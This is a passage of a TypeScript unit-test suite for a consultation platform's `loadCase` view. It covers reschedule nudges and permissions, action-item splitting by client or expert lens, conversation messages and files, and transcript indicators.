    expect(view.nudge).toMatchObject({ kind: 'upcoming', meetingId: 'm1' });
    expect(view.consultations[0]).toMatchObject({ state: 'scheduled' });
  });

  // Item 12 — a race between the PROJECTION read (`findLiveProposals`) and the DETAIL read
  // (`findPendingForAnswer`): the proposal resolved (answered/withdrawn) in between. The nudge
  // must fall all the way back to `upcoming`, never render a `reschedule_proposal` nudge with
  // zero options and a fabricated `proposedAtIso` (the deadline, previously).
  it('CLIENT lens — the detail read finding nothing falls the WHOLE nudge back to upcoming', async () => {
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    m.findLiveProposals.mockResolvedValue([liveProposal()]);
    m.findProposalForAnswer.mockResolvedValue(undefined);

    const view = await loadOrThrow();

    expect(view.nudge).toMatchObject({ kind: 'upcoming', meetingId: 'm1' });
  });

  it('a proposal on a DIFFERENT meeting than nextScheduled does not compete for the header', async () => {
    m.listMeetings.mockResolvedValue([scheduledMeeting('m1')]);
    m.findLiveProposals.mockResolvedValue([liveProposal({ meetingId: 'm-other' })]);

    const view = await loadOrThrow();

    expect(view.nudge).toMatchObject({ kind: 'upcoming', meetingId: 'm1' });
  });
});

describe('loadCase — canProposeReschedule (BAL-411)', () => {
  const SCHEDULED_START = new Date('2026-08-20T10:00:00Z');

  function scheduledMeeting(id = 'm1'): Record<string, unknown> {
    return meeting(id, {
      status: 'scheduled',
      outcome: null,
      startedAt: null,
      scheduledStart: SCHEDULED_START,
    });
  }

  it('is TRUE for the expert on an open case with an upcoming meeting and no live proposal', async () => {
    seed({ access: { lens: 'expert' } });
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);

    const view = await loadOrThrow();
    expect(view).toMatchObject({ canProposeReschedule: true });
  });

  it('is FALSE when a live proposal is already outstanding on the next meeting', async () => {
    seed({ access: { lens: 'expert' } });
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    m.findLiveProposals.mockResolvedValue([
      {
        proposalId: 'proposal-1',
        meetingId: 'm1',
        optionCount: 1,
        originalScheduledStart: SCHEDULED_START,
        expiresAt: new Date('2026-08-20T09:00:00Z'),
      },
    ]);

    const view = await loadOrThrow();
    expect(view).toMatchObject({ canProposeReschedule: false });
  });

  it('is FALSE when nothing is booked — there is no meeting to propose a move on', async () => {
    seed({ access: { lens: 'expert' } });
    const view = await loadOrThrow();
    expect(view).toMatchObject({ canProposeReschedule: false });
    expect(view.nudge).toEqual({ kind: 'nothing_booked' });
  });

  it('is FALSE on a CLOSED case, without resolving any capability for it', async () => {
    seed({
      access: { lens: 'expert' },
      caseRow: { closedAt: new Date('2026-08-01T00:00:00Z'), closeReason: 'resolved' },
    });
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);

    const view = await loadOrThrow();
    expect(view).toMatchObject({ canProposeReschedule: false });
  });

  it('is FALSE when the engagement axis says no', async () => {
    seed({ access: { lens: 'expert' } });
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    mockHasEngagementCapability.mockResolvedValue(false);

    const view = await loadOrThrow();
    expect(view).toMatchObject({ canProposeReschedule: false });
  });
});

// Item 18 (security LOW) — `canManageReschedule` is the WITHDRAW holder set, deliberately
// separate from `canProposeReschedule`: it must stay TRUE precisely when a live proposal
// exists (the one case `canProposeReschedule` is always FALSE), so it needs its OWN coverage
// rather than inheriting the sibling's.
describe('loadCase — canManageReschedule (fix round 1 item 18)', () => {
  const SCHEDULED_START = new Date('2026-08-20T10:00:00Z');

  function scheduledMeeting(id = 'm1'): Record<string, unknown> {
    return meeting(id, {
      status: 'scheduled',
      outcome: null,
      startedAt: null,
      scheduledStart: SCHEDULED_START,
    });
  }

  it('is TRUE for the expert on an open case, WITH a live proposal outstanding (unlike canProposeReschedule)', async () => {
    seed({ access: { lens: 'expert' } });
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    m.findLiveProposals.mockResolvedValue([
      {
        proposalId: 'proposal-1',
        meetingId: 'm1',
        optionCount: 1,
        originalScheduledStart: SCHEDULED_START,
        expiresAt: new Date('2026-08-20T09:00:00Z'),
      },
    ]);
    m.findProposalForAnswer.mockResolvedValue({
      proposal: { id: 'proposal-1', createdAt: new Date('2026-08-13T09:00:00Z') },
      options: [{ id: 'opt-1', scheduledStart: new Date('2026-08-21T10:00:00Z') }],
    });

    const view = await loadOrThrow();
    expect(view).toMatchObject({ canProposeReschedule: false, canManageReschedule: true });
  });

  it('is FALSE on a CLOSED case, without resolving any capability for it', async () => {
    seed({
      access: { lens: 'expert' },
      caseRow: { closedAt: new Date('2026-08-01T00:00:00Z'), closeReason: 'resolved' },
    });
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    mockHasEngagementCapability.mockClear();

    const view = await loadOrThrow();
    expect(view).toMatchObject({ canManageReschedule: false });
    expect(mockHasEngagementCapability).not.toHaveBeenCalled();
  });

  it('is FALSE when the engagement axis says no', async () => {
    seed({ access: { lens: 'expert' } });
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    mockHasEngagementCapability.mockResolvedValue(false);

    const view = await loadOrThrow();
    expect(view).toMatchObject({ canManageReschedule: false });
  });
});

describe('loadCase — action items are bucketed relative to the LENS', () => {
  function item(
    id: string,
    assigneeParty: string | null,
    status = 'open'
  ): Record<string, unknown> {
    return {
      id,
      body: 'Send the sandbox credentials',
      status,
      assigneeParty,
      dueAt: null,
      meetingId: null,
    };
  }

  it('splits yours / theirs / unassigned from the CLIENT seat', async () => {
    m.listActionItems.mockResolvedValue([
      item('a-client', 'client'),
      item('a-expert', 'expert'),
      item('a-none', null),
    ]);
    const view = await loadOrThrow();
    expect(view.actionItems.yours.map((node) => node.id)).toEqual(['a-client']);
    expect(view.actionItems.theirs.map((node) => node.id)).toEqual(['a-expert']);
    expect(view.actionItems.unassigned.map((node) => node.id)).toEqual(['a-none']);
  });

  it('MIRRORS the split from the EXPERT seat — same rows, opposite buckets', async () => {
    seed({ access: { lens: 'expert' } });
    m.listActionItems.mockResolvedValue([item('a-client', 'client'), item('a-expert', 'expert')]);
    const view = await loadOrThrow();
    expect(view.actionItems.yours.map((node) => node.id)).toEqual(['a-expert']);
    expect(view.actionItems.theirs.map((node) => node.id)).toEqual(['a-client']);
  });

  it('counts done against total across every bucket', async () => {
    m.listActionItems.mockResolvedValue([
      item('a1', 'client', 'done'),
      item('a2', 'expert', 'done'),
      item('a3', null),
    ]);
    const view = await loadOrThrow();
    expect(view.actionItems).toMatchObject({ doneCount: 2, totalCount: 3 });
  });

  it('addresses the counterparty by FIRST name on the client lens', async () => {
    const view = await loadOrThrow();
    expect(view.actionItems.counterpartyLabel).toBe('Amara');
  });

  it('addresses the client COMPANY on the expert lens', async () => {
    seed({ access: { lens: 'expert' } });
    const view = await loadOrThrow();
    expect(view.actionItems.counterpartyLabel).toBe('Northwind Industrial');
  });
});

describe('loadCase — the conversation region', () => {
  it('carries the gate-composed writability, so composer and server cannot disagree', async () => {
    seed({ access: { conversationWritable: false } });
    const view = await loadOrThrow();
    expect(view.conversation.writable).toBe(false);
    // ...while staying fully READABLE.
    expect(view.conversation.conversationId).toBe(CONVERSATION_ID);
  });

  it('maps the first page and reports whether more exists', async () => {
    m.listMessagesPage.mockResolvedValue({
      messages: [
        {
          id: 'msg-1',
          conversationId: CONVERSATION_ID,
          body: '<p>Here is the flow.</p>',
          senderUserId: EXPERT_USER_ID,
          senderFirstName: 'Amara',
          senderLastName: 'Okafor',
          createdAt: new Date('2026-07-02T10:00:00Z'),
        },
      ],
      hasEarlier: true,
    });
    const view = await loadOrThrow();
    expect(view.conversation.initialHasEarlier).toBe(true);
    expect(view.conversation.initialMessages).toEqual([
      {
        id: 'msg-1',
        conversationId: CONVERSATION_ID,
        bodyHtml: '<p>Here is the flow.</p>',
        senderUserId: EXPERT_USER_ID,
        senderName: 'Amara Okafor',
        createdAtIso: '2026-07-02T10:00:00.000Z',
      },
    ]);
  });

  /** The repository returns oldest-first; the files panel reads newest-first. */
  it('REVERSES conversation files to newest-first and attributes uploaders in ONE query', async () => {
    m.listConversationFiles.mockResolvedValue([
      convFile('cf-old', EXPERT_USER_ID, '2026-07-01T10:00:00Z'),
      convFile('cf-mid', EXPERT_USER_ID, '2026-07-02T10:00:00Z'),
      convFile('cf-new', USER_ID, '2026-07-03T10:00:00Z'),
    ]);
    m.findNames.mockResolvedValue([
      { id: EXPERT_USER_ID, firstName: 'Amara', lastName: 'Okafor' },
      { id: USER_ID, firstName: 'Dana', lastName: 'Whitfield' },
    ]);

    const view = await loadOrThrow();

    expect(view.conversation.initialFiles.map((file) => file.id)).toEqual([
      'cf-new',
      'cf-mid',
      'cf-old',
    ]);
    // ONE batched query over the DISTINCT uploader set — never one per file.
    const conversationLookups = m.findNames.mock.calls.filter((call) => {
      const [ids] = call as [string[]];
      return ids.includes(EXPERT_USER_ID) && ids.includes(USER_ID);
    });
    expect(conversationLookups).toHaveLength(1);
  });

  it('skips the uploader lookup entirely when the thread has no files', async () => {
    await loadOrThrow();
    expect(m.findNames).not.toHaveBeenCalled();
  });

  it('reports realtime as configured or not, straight from the probe', async () => {
    mockIsRealtimeConfigured.mockReturnValue(false);
    const view = await loadOrThrow();
    expect(view.conversation.realtimeEnabled).toBe(false);
  });
});

function convFile(id: string, uploadedByUserId: string, iso: string): Record<string, unknown> {
  return {
    id,
    conversationId: CONVERSATION_ID,
    fileName: id + '.pdf',
    contentType: 'application/pdf',
    sizeBytes: 2048,
    r2Key: 'conversation-files/secret/' + id,
    uploadedByUserId,
    createdAt: new Date(iso),
  };
}

describe('loadCase — per-consultation counts and the transcript indicator', () => {
  it('counts action items and meeting files against their own consultation', async () => {
    m.listMeetings.mockResolvedValue([meeting('m1'), meeting('m2')]);
    m.listActionItems.mockResolvedValue([
      { id: 'a1', body: 'x', status: 'open', assigneeParty: null, dueAt: null, meetingId: 'm1' },
      { id: 'a2', body: 'y', status: 'open', assigneeParty: null, dueAt: null, meetingId: 'm1' },
      { id: 'a3', body: 'z', status: 'open', assigneeParty: null, dueAt: null, meetingId: null },
    ]);
    m.listMeetingFiles.mockImplementation((meetingId: string) =>
      Promise.resolve(
        meetingId === 'm2'
          ? [
              {
                id: 'mf-1',
                meetingId: 'm2',
                party: 'expert',
                fileName: 'notes.pdf',
                contentType: 'application/pdf',
                sizeBytes: 10,
                r2Key: 'meeting-files/secret',
                uploadedByUserId: EXPERT_USER_ID,
                createdAt: new Date('2026-07-29T05:00:00Z'),
              },
            ]
          : []
      )
    );

    const view = await loadOrThrow();
    const byId = new Map(view.consultations.map((row) => [row.meetingId, row]));
    expect(byId.get('m1')?.actionItemCount).toBe(2);
    expect(byId.get('m2')?.actionItemCount).toBe(0);
    expect(byId.get('m2')?.fileCount).toBe(1);
    expect(byId.get('m1')?.fileCount).toBe(0);
  });

  it('marks ONLY the consultations whose transcript is READY', async () => {
    m.listMeetings.mockResolvedValue([meeting('m1'), meeting('m2')]);
    m.findTranscripts.mockResolvedValue(
      new Map([
        ['m1', { status: 'ready' }],
        ['m2', { status: 'processing' }],
      ])
    );
    const view = await loadOrThrow();
    const byId = new Map(view.consultations.map((row) => [row.meetingId, row]));
    expect(byId.get('m1')?.hasTranscript).toBe(true);
    expect(byId.get('m2')?.hasTranscript).toBe(false);
  });

  it('asks for transcripts ONCE for the whole case, restricted to ENDED consultations', async () => {
    m.listMeetings.mockResolvedValue([
      meeting('m1'),
      meeting('m2', { status: 'scheduled', outcome: null, startedAt: null }),
    ]);
    await loadOrThrow();
    expect(m.findTranscripts).toHaveBeenCalledTimes(1);
    expect(m.findTranscripts).toHaveBeenCalledWith(['m1']);
  });

  it('skips the transcript read entirely when nothing has ended', async () => {
    m.listMeetings.mockResolvedValue([
      meeting('m1', { status: 'scheduled', outcome: null, startedAt: null }),
    ]);
    const view = await loadOrThrow();
    expect(m.findTranscripts).not.toHaveBeenCalled();
    expect(view.consultations[0]?.hasTranscript).toBe(false);
  });

  /** ⚠ NEVER THROWS. A transcript indicator is decoration on a page whose job is to say what
   *  happened; a failed read degrades to "no indicator", never to a failed render. */
  it('degrades a FAILED transcript read to no indicator, and still renders the case', async () => {
    m.findTranscripts.mockRejectedValue(new Error('transcript store down'));
    const view = await loadOrThrow();
    expect(view.consultations[0]?.hasTranscript).toBe(false);
    expect(log.warn).toHaveBeenCalledWith(
      'Case surface transcript lookup failed',
      expect.objectContaining({ meetingCount: 1 })
    );
  });
});

describe('loadCase — the merged files card', () => {
  it('merges conversation files into the card and reports no truncation', async () => {
    m.listConversationFiles.mockResolvedValue([convFile('cf-1', USER_ID, '2026-07-03T10:00:00Z')]);
    const view = await loadOrThrow();
    expect(view.filesTruncated).toBe(false);
    expect(view.files).toHaveLength(1);
    expect(view.files[0]).toMatchObject({ origin: 'conversation', meetingId: null });
  });

  it('never lets an r2Key reach the card', async () => {
    m.listConversationFiles.mockResolvedValue([convFile('cf-1', USER_ID, '2026-07-03T10:00:00Z')]);
    const view = await loadOrThrow();
    expect(JSON.stringify(view.files)).not.toContain('conversation-files/secret');
  });

  it('labels the viewer’s own uploads "You"', async () => {
    m.listConversationFiles.mockResolvedValue([convFile('cf-1', USER_ID, '2026-07-03T10:00:00Z')]);
    const view = await loadOrThrow();
    expect(view.files[0]?.uploaderLabel).toBe('You');
  });
});

describe('loadCase — the surface identity', () => {
  it('echoes the engagement and viewer ids the caller asked about', async () => {
    const view = await loadOrThrow();
    expect(view.engagementId).toBe(ENGAGEMENT_ID);
    expect(view.viewerUserId).toBe(USER_ID);
  });
});
